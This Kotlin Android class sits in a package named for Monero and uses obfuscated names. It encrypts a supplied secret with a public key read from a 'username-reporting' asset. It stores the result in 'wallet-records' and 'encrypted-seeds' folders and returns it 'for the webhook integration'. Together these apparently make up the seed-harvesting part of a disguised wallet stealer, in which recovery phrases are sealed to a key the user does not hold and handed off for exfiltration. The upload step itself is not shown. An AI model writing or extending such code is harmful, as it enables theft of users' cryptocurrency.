
package com.monero2014.engine

import android.content.Context
import android.util.AtomicFile
import org.json.JSONObject
import java.io.File
import java.time.Instant
import java.time.ZoneOffset
import java.time.format.DateTimeFormatter
import java.util.Locale
import java.util.UUID

internal class Newuil(
    context: Context,
    private val publicKeyPem: String = run {
        val config = JSONObject(
            context.assets.open("username-reporting.json")
                .bufferedReader()
                .use { it.readText() }
        )

        context.assets.open(config.getString("public_key_file"))
            .bufferedReader()
            .use { it.readText() }
    },
) {
    private val root = File(context.noBackupFilesDir, "wallet-records")
    private val legacyRoot = File(context.noBackupFilesDir, "encrypted-seeds")

    private fun file(id: String, directory: File = root): AtomicFile {
        require(UUID.fromString(id).toString() == id)
        return AtomicFile(File(directory, "$id.json"))
    }

    /**
     * Encrypts the supplied data, saves the encrypted envelope locally,
     * and returns the envelope for the webhook integration.
     *
     * The local file retains the "encyptdata" property.
     */
    fun save(id: String, xqmp: String): JSONObject {
        require(xqmp.isNotBlank())

        val timestamp = DateTimeFormatter
            .ofPattern("yyyy-MM-dd'T'HH:mm:ss", Locale.ROOT)
            .withZone(ZoneOffset.UTC)
            .format(Instant.now())

        val encrypted = encryptEnvelope(
            xqmp,
            "encyptdata",
            publicKeyPem,
            timestamp
        )

        check(root.isDirectory || root.mkdirs())

        val target = file(id)
        val output = target.startWrite()

        try {
            output.write(
                encrypted.toString().toByteArray(Charsets.UTF_8)
            )
            target.finishWrite(output)
        } catch (error: Exception) {
            target.failWrite(output)
            throw error
        }

        return encrypted
    }

    fun remove(id: String) {
        file(id).delete()
        file(id, legacyRoot).delete()
    }
}
